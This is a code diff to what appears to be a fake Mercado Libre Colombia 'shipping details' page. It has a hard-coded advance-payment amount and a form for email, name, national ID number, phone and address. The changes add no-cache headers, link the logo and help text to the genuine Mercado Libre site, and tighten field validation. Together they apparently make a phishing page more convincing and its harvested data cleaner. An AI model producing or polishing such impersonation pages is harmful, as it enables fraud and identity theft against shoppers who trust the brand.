@@ -25,6 +25,9 @@ $anticipo_pagar = 3000;
 <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0" />
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Datos de envío - Mercado Libre</title>
     
     <link href="https://fonts.googleapis.com/css2?family=Proxima+Nova:wght@300;400;600&display=swap" rel="stylesheet">
@@ -197,8 +200,8 @@ $anticipo_pagar = 3000;
 
     <header class="ml-header">
         <div class="nav-bounds">
-            <a href="#" class="nav-logo"></a>
-            <a href="#" class="nav-help">Ayuda / PQR</a>
+            <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo"></a>
+            <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" class="nav-help">Ayuda / PQR</a>
         </div>
     </header>
 
@@ -209,35 +212,35 @@ $anticipo_pagar = 3000;
         <form id="datosForm">
             <div class="input-group">
                 <label>E-mail</label>
-                <input type="email" id="txtEmail" required placeholder="correo@ejemplo.com">
+                <input type="email" id="txtEmail" required placeholder="correo@ejemplo.com" maxlength="80">
             </div>
 
             <div class="input-group">
                 <label>Nombre y Apellido</label>
-                <input type="text" id="txtNombre" required placeholder="Ej. Juan Pérez">
+                <input type="text" id="txtNombre" required placeholder="Ej. Juan Pérez" maxlength="70" minlength="3">
             </div>
 
             <div class="row-2">
                 <div class="input-group">
                     <label>Cédula de ciudadanía</label>
-                    <input type="tel" id="txtCedula" required placeholder="123456789" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                    <input type="tel" id="txtCedula" required placeholder="123456789" maxlength="10" minlength="6" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                 </div>
                 
                 <div class="input-group">
                     <label>Celular</label>
-                    <input type="tel" id="txtCelular" required placeholder="300 000 0000" oninput="this.value = this.value.replace(/[^0-9]/g, '')" maxlength="10">
+                    <input type="tel" id="txtCelular" required placeholder="3000000000" maxlength="10" minlength="10" inputmode="tel" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                 </div>
             </div>
 
             <div class="row-2">
                 <div class="input-group" style="flex: 2;">
                     <label>Dirección de entrega</label>
-                    <input type="text" id="txtDireccion" required placeholder="Ej. Calle 123 # 45 - 67, Apto 101">
+                    <input type="text" id="txtDireccion" required placeholder="Ej. Calle 123 # 45 - 67, Apto 101" maxlength="100" minlength="5">
                 </div>
                 
                 <div class="input-group" style="flex: 1;">
                     <label>Ciudad</label>
-                    <input type="text" id="txtCiudad" required placeholder="Ej. Bogotá">
+                    <input type="text" id="txtCiudad" required placeholder="Ej. Bogotá" maxlength="50" minlength="3">
                 </div>
             </div>
 
